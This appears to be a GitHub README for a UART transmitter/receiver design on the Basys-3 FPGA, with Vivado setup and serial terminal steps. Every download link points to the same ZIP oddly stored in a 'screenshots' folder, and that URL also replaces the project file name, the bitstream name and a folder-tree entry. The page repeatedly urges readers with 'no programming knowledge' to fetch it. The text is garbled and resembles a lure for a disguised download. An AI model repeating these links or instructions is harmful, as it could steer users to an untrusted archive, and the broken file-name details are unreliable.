# 🎉 UART_TX_RX - Easy UART Communication on FPGA

## 🚀 Getting Started

This guide will help you download and run the UART transmitter and receiver application on the Basys-3 FPGA. No programming knowledge is required.

## 📥 Download Here

[![Download UART_TX_RX](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)

## 📁 Requirements

Before you start, make sure you have the following:

- **Basys-3 FPGA board**: This is essential for running the application.
- **Vivado software**: Install the latest version to support the project.
- **USB cable**: Use this to connect your FPGA board to your computer.

## 🔧 Building the Application

1. **Download the Software**
   - Visit this page to download the latest version of the application: [Download Link](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip).
  
2. **Unzip the Downloaded Files**
   - Once the download is complete, find the ZIP file in your computer's downloads folder. 
   - Right-click on the file and select “Extract All” to unzip its contents to a folder of your choice.

3. **Open Vivado**
   - Launch the Vivado software on your computer.
  
4. **Import the Project**
   - In Vivado, click on "Open Project" and navigate to the folder where you extracted the files.
   - Select the project file named `https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip` and click "Open".

5. **Check the Design**
   - Make sure the project is configured correctly. You should see the `UART_TX_RX` design in the project navigator.

## ⚡ Program the FPGA

1. **Connect the FPGA Board**
   - Connect your Basys-3 board to your computer using the USB cable.

2. **Set the Correct Configuration**
   - In Vivado, select the correct hardware target by going to `Open Hardware Manager`.
   - Click on `Open Target` and then select `Auto Connect`.

3. **Program the Device**
   - Once connected, click on `Program Device`.
   - Choose the appropriate bitstream file, which is usually named `https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip`, and click `Program`.

## 📊 Validate the Connection

After programming your FPGA, you can validate if the UART communication is working correctly.

1. **Connect Serial Cable**
   - Use a serial cable to connect the Basys-3 board to your computer.

2. **Open Terminal Software**
   - Open a terminal application like PuTTY or Tera Term. 
   - Set the serial connection parameters: 
     - Baud Rate: 115200
     - Data Bits: 8
     - Stop Bits: 1
     - Parity: None

3. **Send and Receive Data**
   - You can now start sending and receiving data from the FPGA through the terminal application.

## 🎉 Sample Use Case

You can use the UART communication to send messages from your computer to an LED on the FPGA board. This simple task can help you understand how serial communication works in embedded systems.

1. **Send Command**
   - Type a simple command such as `LED_ON` in the terminal application and hit enter.

2. **Observe LED Behavior**
   - If configured correctly, an LED on the Basys-3 board will turn on in response to your command.

## 💡 Troubleshooting

If you encounter any issues, consider the following steps:

- **Check Connections**: Ensure all cables are properly connected.
- **Verify Baud Rate**: Confirm the baud rate matches in both Vivado and your terminal application.
- **Reprogram the Device**: Sometimes, reprogramming the FPGA can resolve issues.

## 📂 Folder Structure

After unzipping, you will see the following folder structure:

```
UART_TX_RX/
├── RTL/
│   ├── UART_TX_RX.v
│   └── other_verilog_files.v
├── simulation/
│   ├── UART_TX_RX_tb.v
│   └── testbench_files.v
└── https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip
```

## 🔍 Learn More

To dive deeper into the project, you may want to check out the following topics:

- **Verilog**: The hardware description language used for the design.
- **Finite State Machines**: Understanding this concept can help you design more complex systems.
- **Embedded Systems**: This project is a great start for getting into embedded systems and hardware programming.

## 🤝 Support

If you have questions or need help, please feel free to open an issue on the GitHub repository. Make sure to include details about your problem so we can assist you better.

## 📥 Download Again

If you need to re-download the application, click the link below:

[![Download UART_TX_RX](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)